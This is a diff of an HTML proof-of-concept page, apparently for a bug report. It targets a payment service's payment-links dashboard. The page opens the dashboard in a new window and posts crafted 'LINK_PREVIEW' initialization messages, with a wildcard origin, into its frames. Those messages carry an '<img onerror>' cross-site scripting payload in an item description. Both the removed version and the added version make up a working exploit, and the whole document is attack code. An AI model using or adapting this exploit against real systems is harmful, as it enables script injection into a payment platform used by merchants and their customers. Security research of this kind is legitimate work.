@@ -6,91 +6,22 @@
 <body>
 
   <script>
-    const targetUrl = 'https://app.squareup.com/dashboard/payment-links/new';
+    var w = window.open('https://app.squareup.com/dashboard/payment-links/new');
 
-    const payload = {
-      name: 'LINK_PREVIEW',
-      data: {
-        type: 'INITIALIZE',
-        uuid: 'poc-' + Date.now(),
-        data: {
-          checkout_link: {
-            id: 'link-1',
-            link_type: 'ITEM_LINK',
-            checkout_link_data: {
-              name: 'Product',
-              link_type: 'ITEM_LINK',
-              order_details: {
-                line_items: [{
-                  item_id: 'item-1',
-                  quantity: { quantity: 1 }
-                }]
-              }
-            }
-          },
-          related_objects: [{
-            type: 'ITEM',
-            id: 'item-1',
-            item_data: {
-              name: 'Product',
-              description_html: '',
-              description: '<img src=x onerror="alert(document.domain)">',
-              variations: [{
-                type: 'ITEM_VARIATION',
-                id: 'var-1',
-                item_variation_data: {
-                  item_id: 'item-1',
-                  name: 'Default',
-                  pricing_type: 'FIXED_PRICING',
-                  price_money: { amount: 1000, currency: 'USD' }
-                }
-              }]
-            }
-          }],
-          settings: {
-            checkout_title: 'Test Store'
-          }
-        }
+setTimeout(function() {
+      for(var i=0; i<10; i++) {
+          try {
+              w.frames[i].postMessage({
+                  name:'LINK_PREVIEW',
+                  data:{type:'INITIALIZE',uuid:'x',data:{
+                      checkout_link:{id:'l',link_type:'ITEM_LINK',checkout_link_data:{name:'P',link_type:'ITEM_LINK',order_details:{line_items:[{item_id:'i',quantity:{quantity:1}}]}}},
+                      related_objects:[{type:'ITEM',id:'i',item_data:{name:'HACKED',description_html:'',description:'<img src=x onerror=alert(document.domain)>',variations:[{type:'ITEM_VARIATION',id:'v',item_variation_data:{item_id:'i',name:'D',pricing_type:'FIXED_PRICING',price_money:{amount:100,currency:'USD'}}}]}}],
+                      settings:{checkout_title:'HACKED'}
+                  }}
+              },'*');
+          } catch(e){}
       }
-    };
-
-    function sendPayloadMultipleTimes(win, origin = '*', times = 100, delay = 10) {
-      let count = 0;
-      const interval = setInterval(() => {
-        if (win.closed) {
-          console.warn('Target window closed before message could be sent.');
-          clearInterval(interval);
-          return;
-        }
-
-        try {
-          win.postMessage(payload, origin);
-          console.log(`Payload sent (${count + 1}/${times})`);
-        } catch (err) {
-          console.error('postMessage error:', err);
-        }
-
-        count++;
-        if (count >= times) {
-          clearInterval(interval);
-          console.log('Finished sending payload.');
-        }
-      }, delay);
-    }
-
-    function tryWindowOpen() {
-      const win = window.open(targetUrl, '_blank');
-      if (win) {
-        // wait a bit before starting message spam
-        setTimeout(() => {
-          sendPayloadMultipleTimes(win);
-        }, 2000);
-      } else {
-        console.error('Popup blocked or window.open failed');
-      }
-    }
-
-    tryWindowOpen();
+  }, 5000);
   </script>
 </body>
 </html>
